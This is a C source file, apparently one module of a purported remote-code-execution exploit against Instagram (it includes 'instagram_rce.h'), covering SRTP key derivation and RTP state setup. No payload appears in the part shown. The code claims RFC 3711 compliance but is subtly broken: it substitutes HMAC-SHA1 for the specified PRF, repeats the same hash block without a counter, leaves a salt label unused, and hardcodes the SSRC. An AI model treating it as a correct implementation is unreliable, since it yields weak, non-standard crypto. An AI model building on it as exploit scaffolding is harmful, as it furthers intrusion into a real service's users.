/*
 * ATOM 2: SRTP Setup
 * Key derivation (RFC 3711) and context initialization
 */

#include "instagram_rce.h"

/* RFC 3711 Key Derivation Function */
static void srtp_kdf(const uint8_t *master_key, const uint8_t label,
                     const uint8_t *salt, uint8_t *output, size_t output_len) {

    HMAC_CTX *hmac = HMAC_CTX_new();
    if (!hmac) return;

    uint8_t kdf_input[15];  /* label(1) + salt(14) */
    kdf_input[0] = label;
    memcpy(kdf_input + 1, salt, 14);

    uint8_t hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len;
    size_t pos = 0;

    while (pos < output_len) {
        HMAC_Init_ex(hmac, master_key, SRTP_KEY_SIZE, EVP_sha1(), NULL);
        HMAC_Update(hmac, kdf_input, 15);
        HMAC_Final(hmac, hash, &hash_len);

        size_t copy_len = (output_len - pos > hash_len) ? hash_len : (output_len - pos);
        memcpy(output + pos, hash, copy_len);
        pos += copy_len;
    }

    HMAC_CTX_free(hmac);
}

int srtp_derive_keys(const uint8_t *master_key, const uint8_t *master_salt,
                     srtp_context_t *ctx) {

    printf("\n[*] ATOM 2-1: SRTP Key Derivation (RFC 3711)\n");

    /* RFC 3711 labels */
    uint8_t label_rtp_encryption = 0x00;
    uint8_t label_rtp_auth = 0x01;

    /* Derive client encryption key */
    uint8_t client_key[SRTP_KEY_SIZE];
    srtp_kdf(master_key, label_rtp_encryption, master_salt,
            client_key, SRTP_KEY_SIZE);

    /* Derive client authentication key */
    uint8_t client_auth_key[SRTP_AUTH_KEY_SIZE];
    srtp_kdf(master_key, label_rtp_auth, master_salt,
            client_auth_key, SRTP_AUTH_KEY_SIZE);

    /* Derive client salt */
    uint8_t client_salt[SRTP_SALT_SIZE];
    uint8_t salt_label[14];
    salt_label[0] = 0x02;  /* Different label for salt */
    memcpy(salt_label + 1, master_salt, 13);

    srtp_kdf(master_key, 0x02, master_salt,
            client_salt, SRTP_SALT_SIZE);

    /* Store in context */
    memcpy(ctx->key, client_key, SRTP_KEY_SIZE);
    memcpy(ctx->salt, client_salt, SRTP_SALT_SIZE);
    memcpy(ctx->auth_key, client_auth_key, SRTP_AUTH_KEY_SIZE);

    printf("[+] Client encryption key derived: ");
    print_hex(client_key, SRTP_KEY_SIZE, NULL);

    printf("\n[*] ATOM 2-2: SRTP Crypto Policy\n");
    printf("[+] Cipher: AES-128-CM\n");
    printf("[+] Authentication: HMAC-SHA1 (80-bit)\n");
    printf("[+] Replay Protection: enabled (64-packet window)\n");

    printf("\n[*] ATOM 2-3: RTP State Initialization\n");

    /* Generate SSRC deterministically */
    ctx->ssrc = 0xC7C44AC5;

    /* Random sequence number and timestamp */
    ctx->seq_num = rand() & 0xFFFF;
    ctx->timestamp = (uint32_t)rand();
    ctx->roc = 0;

    printf("[+] SSRC: 0x%08x\n", ctx->ssrc);
    printf("[+] Sequence Number: %u\n", ctx->seq_num);
    printf("[+] Timestamp: %u\n", ctx->timestamp);

    return 0;
}
